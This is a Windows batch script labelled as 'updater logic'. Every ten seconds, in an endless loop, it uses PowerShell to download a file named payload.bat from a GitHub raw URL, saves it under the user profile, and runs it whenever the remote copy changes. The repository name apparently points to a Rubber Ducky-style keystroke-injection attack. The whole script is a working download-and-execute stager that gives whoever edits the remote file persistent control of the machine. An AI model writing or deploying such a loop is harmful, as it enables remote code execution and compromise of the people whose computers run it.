@echo off
:: =========================================
:: Your updater logic
:: =========================================
setlocal enabledelayedexpansion

set "url=https://raw.githubusercontent.com/dexovision/rubitoutducky/main/payload.bat"
set "local=%USERPROFILE%\payload.bat"
set "temp=%TEMP%\payload_new.bat"
set "interval=10"

:main
if not exist "%local%" (
    powershell -NoProfile -Command ^
        "(Invoke-WebRequest -Uri '%url%' -UseBasicParsing).Content | Out-File -Encoding ASCII '%local%'"
)

powershell -NoProfile -Command ^
    "(Invoke-WebRequest -Uri '%url%' -UseBasicParsing).Content | Out-File -Encoding ASCII '%temp%'"

if exist "%temp%" (
    for %%A in ("%temp%") do if %%~zA neq 0 (
        if exist "%local%" (
            fc "%temp%" "%local%" >nul
            if errorlevel 1 (
                del /f /q "%local%" >nul
                move /y "%temp%" "%local%" >nul
                start "" "%local%"
            ) else (
                del "%temp%" >nul
            )
        ) else (
            move /y "%temp%" "%local%" >nul
            start "" "%local%"
        )
    ) else (
        del "%temp%" >nul
    )
)

timeout /t %interval% >nul
goto main
